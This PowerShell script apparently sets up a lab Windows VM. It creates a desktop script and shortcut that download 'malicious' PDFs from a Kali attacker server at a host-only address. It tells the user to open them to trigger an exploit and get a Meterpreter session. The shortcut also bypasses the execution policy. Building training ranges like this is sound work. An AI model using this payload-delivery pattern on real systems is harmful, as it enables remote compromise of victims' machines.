# Setup PDF Download Script
# Creates a script on Desktop to download malicious PDFs from Kali HTTP server

Write-Host "===================================================" -ForegroundColor Cyan
Write-Host "  Setting Up PDF Download Script" -ForegroundColor Cyan
Write-Host "===================================================" -ForegroundColor Cyan
Write-Host

$KALI_IP = "192.168.56.101"
$HTTP_PORT = 8080
$DESKTOP = "C:\Users\vagrant\Desktop"

# Create the download script content
$downloadScript = @'
# Download Malicious PDFs from Kali HTTP Server
# This script downloads PDFs from 192.168.56.101:8080

$KALI_IP = "192.168.56.101"
$HTTP_PORT = 8080
$BASE_URL = "http://${KALI_IP}:${HTTP_PORT}"
$DESKTOP = "$env:USERPROFILE\Desktop"

Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "  Downloading Malicious PDFs from Kali" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host
Write-Host "Source: $BASE_URL" -ForegroundColor Gray
Write-Host "Destination: $DESKTOP" -ForegroundColor Gray
Write-Host

# PDF files to download
$PDF_FILES = @(
    "JOAN-ESPINACH-TRD.pdf",
    "JOAN-ESPINACH-ALT.pdf"
)

# Test connectivity to Kali HTTP server
Write-Host "[1/4] Testing connection to Kali HTTP server..." -NoNewline
try {
    $response = Invoke-WebRequest -Uri $BASE_URL -Method Head -TimeoutSec 5 -ErrorAction Stop
    Write-Host " SUCCESS" -ForegroundColor Green
    Write-Host "    HTTP server is running on Kali" -ForegroundColor Gray
} catch {
    Write-Host " FAILED" -ForegroundColor Red
    Write-Host ""
    Write-Host "ERROR: Cannot reach Kali HTTP server at ${KALI_IP}:${HTTP_PORT}" -ForegroundColor Red
    Write-Host ""
    Write-Host "Troubleshooting steps:" -ForegroundColor Yellow
    Write-Host "  1. Make sure Kali VM is running" -ForegroundColor Yellow
    Write-Host "  2. On Kali, check HTTP server: sudo netstat -tulnp | grep 8080" -ForegroundColor Yellow
    Write-Host "  3. Verify network: ping $KALI_IP" -ForegroundColor Yellow
    Write-Host ""
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host

# List available files on Kali server
Write-Host "[2/4] Checking available PDF files on Kali..." -ForegroundColor Cyan
try {
    $indexPage = Invoke-WebRequest -Uri $BASE_URL -TimeoutSec 5
    $availablePDFs = @()

    # Parse HTML directory listing to find PDF files
    $pdfMatches = [regex]::Matches($indexPage.Content, 'href="([^"]*\.pdf)"')
    foreach ($match in $pdfMatches) {
        $pdfName = $match.Groups[1].Value
        $availablePDFs += $pdfName
        Write-Host "  ✓ Found: $pdfName" -ForegroundColor Green
    }

    if ($availablePDFs.Count -eq 0) {
        Write-Host "  ⚠ WARNING: No PDF files found on Kali server!" -ForegroundColor Yellow
        Write-Host "    The PDFs may not have been generated yet." -ForegroundColor Yellow
        Write-Host "    Make sure Kali has run the PDF generation script." -ForegroundColor Yellow
        Write-Host ""
        Read-Host "Press Enter to continue anyway (downloads will fail)"
    }
} catch {
    Write-Host "  ⚠ Could not list files (server may not support directory listing)" -ForegroundColor Yellow
}

Write-Host

# Download PDFs
Write-Host "[3/4] Downloading PDF files..." -ForegroundColor Cyan
$downloadedCount = 0

foreach ($pdf in $PDF_FILES) {
    $url = "$BASE_URL/$pdf"
    $destination = Join-Path $DESKTOP $pdf

    Write-Host "  Downloading $pdf..." -NoNewline

    try {
        Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction Stop

        if (Test-Path $destination) {
            $sizeKB = [math]::Round((Get-Item $destination).Length / 1KB, 2)
            Write-Host " OK (${sizeKB}KB)" -ForegroundColor Green
            $downloadedCount++
        } else {
            Write-Host " FAILED" -ForegroundColor Red
        }
    } catch {
        Write-Host " NOT FOUND" -ForegroundColor Yellow
        Write-Host "    File may not exist on Kali server" -ForegroundColor Gray
    }
}

Write-Host

# Verify downloads
Write-Host "[4/4] Verification..." -ForegroundColor Cyan
if ($downloadedCount -eq 0) {
    Write-Host "  ERROR: No PDFs were downloaded!" -ForegroundColor Red
    Write-Host ""
    Write-Host "The HTTP server may not have any PDFs available yet." -ForegroundColor Yellow
    Write-Host "Make sure Kali has generated the PDFs first." -ForegroundColor Yellow
} elseif ($downloadedCount -eq $PDF_FILES.Count) {
    Write-Host "  SUCCESS: All PDFs downloaded ($downloadedCount/$($PDF_FILES.Count))" -ForegroundColor Green
    Write-Host ""
    Write-Host "================================================================" -ForegroundColor Green
    Write-Host "  PDFs are ready on your Desktop!" -ForegroundColor Green
    Write-Host "================================================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "IMPORTANT:" -ForegroundColor Red
    Write-Host "  1. Make sure Metasploit listener is running on Kali" -ForegroundColor Yellow
    Write-Host "  2. Double-click any PDF to trigger the exploit" -ForegroundColor Yellow
    Write-Host "  3. You should get a Meterpreter session on Kali" -ForegroundColor Yellow
} else {
    Write-Host "  WARNING: Only $downloadedCount/$($PDF_FILES.Count) PDFs downloaded" -ForegroundColor Yellow
    Write-Host "  Some files may not be available on the server" -ForegroundColor Yellow
}

Write-Host ""
Read-Host "Press Enter to close this window"
'@

# Save the download script to Desktop
$scriptPath = Join-Path $DESKTOP "Download-PDFs-from-Kali.ps1"

Write-Host "[1/2] Creating download script on Desktop..." -NoNewline
try {
    $downloadScript | Out-File -FilePath $scriptPath -Encoding ASCII -Force
    Write-Host " Done" -ForegroundColor Green
    Write-Host "    Location: $scriptPath" -ForegroundColor Gray
} catch {
    Write-Host " Failed" -ForegroundColor Red
    Write-Host "    Error: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

Write-Host

# Create a shortcut to run the script easily
Write-Host "[2/2] Creating desktop shortcut..." -NoNewline

$shortcutPath = Join-Path $DESKTOP "Download Malicious PDFs.lnk"
$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut($shortcutPath)
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
$Shortcut.WorkingDirectory = $DESKTOP
$Shortcut.Description = "Download malicious PDFs from Kali HTTP server"
$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,21"  # Download icon
$Shortcut.Save()

Write-Host " Done" -ForegroundColor Green
Write-Host "    Shortcut: $shortcutPath" -ForegroundColor Gray

Write-Host
Write-Host "===================================================" -ForegroundColor Green
Write-Host "  Setup Complete" -ForegroundColor Green
Write-Host "===================================================" -ForegroundColor Green
Write-Host
Write-Host "After reboot, you can:" -ForegroundColor Cyan
Write-Host "  1. Double-click 'Download Malicious PDFs' on Desktop" -ForegroundColor Gray
Write-Host "  2. PDFs will be downloaded from Kali (${KALI_IP}:${HTTP_PORT})" -ForegroundColor Gray
Write-Host "  3. This validates network connectivity automatically" -ForegroundColor Gray
Write-Host
